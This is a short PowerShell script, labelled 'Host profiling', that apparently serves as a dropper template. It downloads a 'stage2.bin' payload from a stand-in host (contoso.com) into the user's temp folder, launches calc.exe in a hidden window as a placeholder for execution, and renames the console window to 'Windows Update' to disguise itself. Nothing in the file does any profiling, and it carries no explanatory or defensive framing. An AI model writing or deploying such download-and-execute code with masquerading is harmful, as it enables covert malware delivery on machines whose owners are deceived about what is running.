
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://contoso.com/stage2.bin',
    [string]$PayloadPath = "$env:TEMP\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
